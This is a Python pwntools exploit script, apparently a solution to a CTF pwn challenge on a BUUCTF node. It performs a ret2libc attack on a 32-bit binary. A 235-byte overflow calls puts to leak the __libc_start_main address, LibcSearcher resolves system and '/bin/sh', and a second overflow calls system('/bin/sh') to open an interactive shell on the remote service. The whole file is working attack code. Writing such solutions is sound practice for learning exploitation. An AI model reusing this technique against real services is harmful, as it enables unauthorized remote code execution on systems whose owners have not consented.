from pwn import *
from LibcSearcher import *

context(os="linux",arch="i386")

elf = ELF("./pwn")
#io=remote("192.168.95.131",10001)
io=remote("node4.buuoj.cn",29028)

__libc_start_main_got_addr = elf.got["__libc_start_main"]
puts_plt_addr = elf.plt["puts"]
main_addr     = 0x08048825


pause()
print("发送第1个payload......")
payload_one = p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0xff)
pause()
io.sendline(payload_one)

payload_tow = flat(b"A"*235,puts_plt_addr,main_addr,__libc_start_main_got_addr)
pause()
print("发送第2个payload......")
io.sendline(payload_tow)
print(io.recvuntil(b"Correct\n"))


real__libc_start_main_addr = io.recv(4)
real__libc_start_main_addr = u32(real__libc_start_main_addr)
print(hex(real__libc_start_main_addr))

obj = LibcSearcher("__libc_start_main",real__libc_start_main_addr)
libcbase = real__libc_start_main_addr - obj.dump("__libc_start_main") 
system_addr = libcbase + obj.dump("system") #system 偏移 
bin_sh_addr = libcbase + obj.dump("str_bin_sh") #/bin/sh 偏移

print(hex(system_addr))
print(hex(bin_sh_addr))

pause()

print("发送第1个payload......")
payload_one = p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0x0)+p8(0xff)
pause()
io.sendline(payload_one)

payload_tow = flat(b"A"*235,system_addr,main_addr,bin_sh_addr)
pause()
print("发送第2个payload......")
io.sendline(payload_tow)
print(io.recvuntil(b"Correct\n"))


io.interactive()